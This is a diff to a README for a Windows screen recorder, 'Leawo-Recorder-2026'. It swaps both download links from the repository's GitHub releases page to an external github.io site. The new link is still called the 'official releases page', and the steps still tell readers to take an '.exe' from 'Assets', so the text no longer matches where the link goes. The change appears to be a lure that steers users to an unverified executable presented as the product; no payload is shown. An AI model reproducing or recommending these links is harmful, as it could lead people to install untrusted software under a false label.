@@ -1,6 +1,6 @@
 # 📹 Leawo-Recorder-2026 - Record your screen with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aguish-tuneup236/Leawo-Recorder-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://aguish-tuneup236.github.io)
 
 Leawo-Recorder-2026 captures your screen activity and audio on Windows 11 and Windows 10. The software records video presentations, live streams, and online meetings. You save files in high quality without complicated settings.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to set up the software on your computer:
 
-1.  Visit the [official releases page](https://github.com/aguish-tuneup236/Leawo-Recorder-2026/releases) to access the installation files.
+1.  Visit the [official releases page](https://aguish-tuneup236.github.io) to access the installation files.
 2.  Look for the latest version under the "Assets" section.
 3.  Click the link that ends in ".exe" to begin the download.
 4.  Navigate to your "Downloads" folder once the file finishes saving.
